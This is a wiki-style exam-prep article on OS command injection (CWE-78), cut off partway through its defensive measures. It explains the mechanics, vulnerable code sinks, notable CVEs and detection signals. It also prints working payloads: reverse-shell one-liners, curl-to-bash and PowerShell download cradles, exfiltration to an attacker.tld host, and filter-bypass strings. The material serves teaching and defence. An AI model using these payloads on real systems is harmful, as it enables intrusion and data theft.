---
domain: "application-security"
tags: [injection, rce, web-security, owasp, appsec, attack]
---
# Command Injection

**Command injection** (also called **OS command injection** or **shell injection**) is a class of [[Injection Attacks|injection vulnerability]] in which attacker-supplied input causes a vulnerable application to execute arbitrary operating system commands on its host. It occurs when user-controlled data is concatenated into a string handed to a system shell without adequate neutralization, and it ranks among the most dangerous findings in the [[OWASP Top 10]] because successful exploitation typically yields full [[Remote Code Execution]] under the privileges of the affected process. MITRE tracks the root cause as **CWE-78: Improper Neutralization of Special Elements used in an OS Command**.

---

## Overview

Command injection has existed for as long as programs have built shell command strings from untrusted input. Early 1990s Unix CGI scripts were notorious for it: a Perl handler calling `system("finger $user")` with `$user` taken from a web form would happily execute `; cat /etc/passwd` when supplied. MITRE classifies it as **CWE-78** and it falls under the **A03:2021 — Injection** category of the [[OWASP Top 10]], consistently appearing in the CWE Top 25 Most Dangerous Software Weaknesses year after year.

The vulnerability exists because most operating-system shells — Bourne shell, bash, zsh, `cmd.exe`, PowerShell — interpret a set of metacharacters (`;`, `|`, `&`, `&&`, `||`, backticks, `$()`, newline) as control tokens that chain, redirect, or substitute commands. When a developer concatenates user input into a command string and passes it to a shell via functions such as `system()`, `exec()`, `popen()`, `os.system()`, `child_process.exec()`, or language backticks, those metacharacters retain their special meaning and break out of the intended command context entirely.

Command injection is distinct from **code injection**, where an attacker injects code in the application's own language (PHP `eval()`, Python `pickle`, [[Server-Side Template Injection|server-side template injection]]). It is also distinct from [[SQL Injection]], which targets a database query parser, and from [[Cross-Site Scripting]] (XSS), which targets the browser. The hallmark of command injection is that execution occurs in the **operating system shell of the server**, granting access to the filesystem, network stack, environment variables, and any credentials the process holds in memory or on disk.

Real-world consequences are severe. A single exploitable parameter has led to credential theft from CI/CD runners, cryptomining worms on network appliances, and full datacentre compromise. The 2014 **Shellshock** vulnerability (CVE-2014-6271) in GNU Bash — a parser flaw that enabled mass command injection through CGI `User-Agent` and `Cookie` headers — was exploited in the wild within hours of public disclosure. Edge devices from Fortinet, Cisco, SonicWall, Palo Alto, and D-Link have repeatedly shipped with command-injection bugs in their web management consoles, and many now appear on the CISA **Known Exploited Vulnerabilities** (KEV) catalog.

Because many vulnerable applications run as `root`, `SYSTEM`, `www-data`, or other highly privileged accounts — especially on embedded network appliances — command injection is frequently a single-shot path to full host compromise, making it a top-priority class of vulnerability for attackers, defenders, and bug-bounty hunters alike.

---

## How It Works

At its core, command injection occurs when untrusted input reaches a **shell interpreter** without being structurally separated from the command itself. Consider a simple PHP endpoint that pings a user-supplied host:

```php
<?php
$host = $_GET['host'];
$output = shell_exec("ping -c 1 " . $host);
echo "<pre>$output</pre>";
?>
```

A benign request `?host=8.8.8.8` produces `ping -c 1 8.8.8.8`. But `?host=8.8.8.8; id` produces `ping -c 1 8.8.8.8; id` — the shell runs both commands and returns the output of `id` directly in the page.

### Shell Metacharacters

| Metacharacter | Behavior |
|---|---|
| `;` | Sequential command separator (bash, sh) |
| `&&` | Run second command only if first succeeds |
| `\|\|` | Run second command only if first fails |
| `\|` | Pipe stdout of left command to right |
| `&` | Background execution / Windows separator |
| `` ` ` `` | Command substitution (backtick) |
| `$( )` | POSIX command substitution |
| `\n` / `%0a` | Newline acts as command separator |
| `>`, `<`, `>>` | I/O redirection |

### Injection Categories

**1. In-band (Classic):** The injected command's output is reflected directly in the HTTP response.

```
GET /ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1
```

**2. Blind Command Injection:** Output is suppressed. The attacker confirms execution via side channels:

- **Time-based:** Inject `; sleep 10` and measure response latency. A 10-second delay confirms execution.
- **Out-of-band (OOB):** Exfiltrate data via DNS query or HTTP callback to an attacker-controlled listener (Burp Collaborator, Interactsh):

```bash
; curl http://$(whoami).attacker.tld/
# or DNS-only environments:
; nslookup $(id | base64).attacker.tld
```

**3. Argument Injection:** No shell metacharacter is needed. User-controlled input is accepted as an argument to a binary that treats certain flags specially. Examples:

```bash
# Git with attacker-controlled repo URL
git clone -u "attacker --upload-pack=malicious" ssh://...

# SSH with attacker-controlled hostname
ssh "-oProxyCommand=id" target

# curl with @ operator reading local files
curl @/etc/passwd
```

### Language-Specific Dangerous Sinks

```python
# Python — DANGEROUS when shell=True
import subprocess
subprocess.call(f"ping {host}", shell=True)
os.system(f"ping {host}")
```

```javascript
// Node.js — DANGEROUS (child_process.exec passes to sh -c)
const { exec } = require('child_process');
exec(`ping ${host}`, (err, stdout) => { res.send(stdout); });
```

```ruby
# Ruby — DANGEROUS (backticks and system() both invoke shell)
output = `ping #{host}`
system("ping #{host}")
```

```java
// Java — DANGEROUS when shell -c is used
Runtime.getRuntime().exec(new String[]{"sh", "-c", "ping " + host});
```

```php
<?php
shell_exec("ping $host");   // dangerous
exec("nslookup $host");     // dangerous
passthru("host $host");     // dangerous
?>
```

### Exploitation Walkthrough

1. **Discovery.** Locate parameters that plausibly feed OS commands — hostnames, filenames, conversion settings, log paths, export filenames, or cron-management fields.
2. **Fingerprinting.** Inject a benign marker: `; echo COCYTUS123`. Look for it in the response body, headers, or file output.
3. **Blind detection.** If no reflection, try `; sleep 10` or `& timeout /t 10` (Windows). A hanging response confirms injection.
4. **Enumeration.** Run `id`, `uname -a`, `whoami /all`, `ipconfig`, `cat /etc/passwd`, `env` to map the execution context.
5. **Staging a reverse shell.** Download and execute a stager:

```bash
# Linux
; bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
; curl http://10.0.0.5/shell.sh | bash

# Windows
& powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/s.ps1')"
```

6. **Persistence.** Write SSH authorized keys, cron jobs, systemd units, or webshells. Pivot to other internal hosts.

### Filter Bypass Techniques

Naive denylists are routinely defeated:

```bash
# Whitespace bypasses (when spaces are filtered)
cat${IFS}/etc/passwd
{cat,/etc/passwd}

# Semicolons filtered
cat /etc/passwd%0aid    # newline separator

# Keyword splitting
c""at /etc/passwd
c'a't /etc/passwd
/???/??t /etc/passwd    # glob expansion → /bin/cat

# URL encoding by double-submission
%3B → ;   %7C → |   %26 → &   %60 → `
```

---

## Key Concepts

- **Shell metacharacter:** A character interpreted by the shell as a control token rather than literal text (`;`, `|`, `&`, backticks, `$()`). Command injection reduces to the failure to neutralize or avoid these characters before they reach a shell interpreter.
- **Blind command injection:** An injection variant where the command output is not reflected in the response. Detected via timing delays (`sleep`, `timeout`) or out-of-band channels (DNS callbacks, HTTP to a Collaborator server). Requires different testing methodology than classic in-band injection.
- **Argument injection:** A subclass in which no shell metacharacter is needed because the attacker's input is passed as an option or special argument to a target binary (e.g., `-oProxyCommand` for `ssh`, `--config` for git, `@filename` for curl). Not defeated by metacharacter filtering alone.
- **Out-of-band (OOB) exploitation:** Technique for confirming execution or exfiltrating data through channels external to the HTTP response — DNS queries, HTTP callbacks, or SMTP. Used when output is fully suppressed and timing is unreliable. Burp Collaborator and ProjectDiscovery's Interactsh are the canonical tools.
- **Source and sink (taint analysis):** The **source** is attacker-controlled input (query parameter, HTTP header, filename, cookie); the **sink** is a function that executes OS commands (`system()`, `exec()`, `popen()`). A vulnerability exists when data flows from source to sink without adequate sanitization or structural separation.
- **`execve` vs. shell invocation:** Calling `execve()` directly (or array-based subprocess APIs with `shell=False`) passes arguments to the binary as-is through the kernel, bypassing shell metacharacter interpretation entirely. This is the primary safe pattern. Calling `sh -c "<string>"` or `system("<string>")` involves shell parsing and is the unsafe pattern.
- **Allowlist vs. denylist:** Denylists that filter metacharacters are trivially bypassed via encoding, whitespace substitution (`${IFS}`), Unicode normalization, or character-splitting tricks. A strict **allowlist** of expected characters (e.g., `^[0-9.]{7,15}$` for an IPv4 input) is the only robust textual mitigation.

---

## Exam Relevance

**SY0-701 Domain Coverage:** Command injection appears in **Domain 2 — Threats, Vulnerabilities, and Mitigations**, specifically:
- **2.3 — Explain various types of vulnerabilities** (injection attacks sub-topic)
- **2.4 — Given a scenario, analyze indicators of malicious activity** (application attacks)

**Common Question Patterns:**

- A scenario describes a web form accepting a hostname or filename that passes it to a back-end utility (ping, nslookup, traceroute, convert). Output includes unexpected system text. → Answer: **OS command injection**.
- "Which vulnerability type allows an attacker to run arbitrary OS commands by manipulating user input?" → **Command injection / OS command injection** (not SQLi, which targets a DB; not XSS, which targets the browser).
- Mitigation questions expect **input validation with an allowlist** and **use of APIs that avoid shell invocation** as the primary controls. WAFs are supplementary, not primary.
- The exam may ask you to identify the vulnerability class from a code snippet — look for `system()`, `exec()`, `popen()`, backtick operators, or `shell=True`.
- Expect [[OWASP Top 10]] questions that group injection types together: SQL, LDAP, OS command, XML/XPath all fall under **A03:2021 Injection**.

**Gotchas:**
- Do **not** confuse with **[[Directory Traversal]]** (`../../../etc/passwd`), which reads files but does not execute commands.
- Do **not** confuse with **code injection** (injecting PHP, Python eval, SSTI) — command injection targets the OS shell specifically.
- **Shellshock (CVE-2014-6271)** is a real-world example of command injection via environment variables; recognize it as a canonical case, not a separate vulnerability class.
- CompTIA uses "command injection" and "OS command injection" interchangeably in questions.
- "Sanitization" on the exam means **allowlist-based input validation**, not stripping individual dangerous characters.

---

## Security Implications

Command injection is one of the most impactful vulnerability classes in practice. Because execution occurs at OS level under the web process's account, a single successful injection can cascade from initial foothold to full host compromise, lateral network movement, data exfiltration, and persistent backdoor installation — often within minutes.

### Notable CVEs and Incidents

| CVE | Affected Product | Impact |
|---|---|---|
| **CVE-2014-6271** | GNU Bash (Shellshock) | RCE via CGI environment variables; mass-exploited globally within hours |
| **CVE-2016-3714** | ImageMagick (ImageTragick) | RCE triggered by uploading a crafted image via delegate policy |
| **CVE-2021-44228** | Apache Log4j (Log4Shell) | JNDI injection enabling RCE via logged attacker-controlled strings |
| **CVE-2022-1388** | F5 BIG-IP iControl REST | Auth bypass + command injection; actively exploited within days |
| **CVE-2023-46604** | Apache ActiveMQ | Command execution via OpenWire deserialization; used by HelloKitty ransomware |
| **CVE-2024-3400** | Palo Alto GlobalProtect | Command injection via crafted `SESSID` cookie; zero-day exploited by UTA0218 against government targets |
| **CVE-2024-21762** | Fortinet FortiOS SSL-VPN | Out-of-bounds write + command injection family; added to CISA KEV |

The **Mirai botnet (2016)** propagated largely through command injection in the web management consoles of default-credentialed consumer routers and IP cameras, eventually generating record-setting DDoS traffic exceeding 1 Tbps.

### Detection Signals

- **Web/application logs:** Parameters containing `;`, `|`, `$(`, backticks, or their URL-encoded forms (`%3B`, `%7C`, `%60`, `%0a`) where numeric or hostname values are expected.
- **Process lineage:** Web server (`httpd`, `nginx`, `w3wp.exe`, `node`) spawning `sh`, `bash`, `cmd.exe`, `powershell.exe`, `curl`, `wget`, `nc`, `nslookup`, or `python`.
- **Outbound network anomalies:** Web-tier hosts initiating unexpected outbound connections to Pastebin, raw.githubusercontent.com, transfer.sh, or random external IPs on ports 4444, 1337, 9001.
- **DNS telemetry:** Unusual subdomains under external domains encoding command output (e.g., `d3JlY3Q=.attacker.tld` — base64 encoded data in subdomain labels).
- **EDR rules:** Process chain alerts for `w3wp.exe → cmd.exe`, `apache2 → /bin/sh → id`, `tomcat → curl`.

---

## Defensive Measures

The single most effective defense is **never pass untrusted input to a shell**. The following controls are